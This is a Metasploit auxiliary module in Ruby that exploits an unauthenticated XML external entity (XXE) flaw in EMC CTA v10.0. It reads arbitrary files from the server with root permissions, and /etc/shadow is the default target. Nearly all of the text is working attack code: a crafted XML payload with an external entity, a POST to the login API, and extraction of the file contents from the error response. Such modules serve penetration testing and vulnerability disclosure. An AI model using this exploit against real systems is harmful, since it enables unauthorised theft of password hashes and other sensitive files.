# This module requires Metasploit: http//metasploit.com/download
##
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read',
      'Description'    => %q{
      EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
      that allows an attacker to read arbitrary files from the file system
      with the permissions of the root user.
      },
      'License'        => 'ExploitHub',
      'Version'        => "1",
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile@gmail.com>', #metasploit module
        ],
      'References'     =>
        [['URL', 'https://gist.github.com/brandonprry/9920685']
        ],
      'DisclosureDate' => 'Mar 31 2014'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('SSLVersion', [true, 'SSL version', 'TLS1']),
        OptString.new('TARGETURI', [ true, "Base directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
      ], self.class)
  end

  def run

    pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}" >]>
<Request>
<Username>root</Username>
<Password>&xxe;</Password>
</Request>
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'login'),
      'method' => 'POST',
      'data' => pay
    })

    file = /For input string: "(.*)"/m.match(res.body)
    file = file[1]

    path = store_loot('emc.file', 'text/plain', datastore['RHOST'], file, datastore['FILEPATH'])

    print_good("File saved to: " + path)
  end
end

